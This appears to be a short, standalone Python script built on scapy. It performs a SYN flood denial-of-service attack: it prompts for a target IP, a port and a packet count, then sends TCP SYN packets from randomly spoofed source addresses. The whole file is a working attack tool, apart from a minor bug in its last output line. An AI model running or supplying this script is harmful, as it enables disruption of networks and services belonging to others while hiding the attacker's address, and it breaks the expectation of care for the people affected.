from os import system 
from sys import stdout
from scapy.all import *
from random import randint
def generateIP():
    IP=".".join (map(str,(randint(0,255)for _ in range(4))))
    return IP

def randInt():
    num=randint(1000,9000)
    return num

def getInfo():
    targetIP=input("\nTarget IP:")
    targetPort=input()
    return targetIP,int(targetPort)

def SYN_FLOOD(targetIP,targetPort,numberOfPacket):
    packetSEND=0
    stdout.write("\n\t\tSending Packets... ")

    for i in range(0,numberOfPacket):
        port=randInt()
        Seq=randInt()
        win=randInt()

        IP_Packet=IP()
        IP_Packet.src=generateIP()
        IP_Packet.dst=targetIP

        TCP_Packet= TCP()
        TCP_Packet.sport=port
        TCP_Packet.dport=targetPort
        TCP_Packet.flags="S"
        TCP_Packet.seq=Seq
        TCP_Packet.window=win

        send(IP_Packet/TCP_Packet, verbose=0)
        packetSEND=packetSEND+1
    stdout.write("\n Send %i packets\n",packetSEND)



def syn():
    targetIP,targetPort=getInfo()
    numberOfPacket=input("\nEnter the number of packet to be send:")
    SYN_FLOOD(targetIP,targetPort,int(numberOfPacket))

syn()